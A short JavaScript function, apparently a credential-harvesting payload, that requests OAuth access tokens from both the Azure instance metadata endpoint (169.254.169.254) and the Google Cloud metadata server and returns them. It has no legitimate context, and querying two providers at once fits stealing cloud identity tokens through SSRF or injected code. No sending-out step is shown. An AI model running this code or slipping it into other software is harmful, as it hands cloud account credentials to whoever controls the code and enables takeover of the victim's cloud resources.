async function metadata() {
    const azure = await fetch("http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", {headers: {Metadata: "true"}});
    const gcp = await fetch("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", {headers: {"Metadata-Flavor": "Google"}});
    return [await azure.text(), await gcp.text()];
}
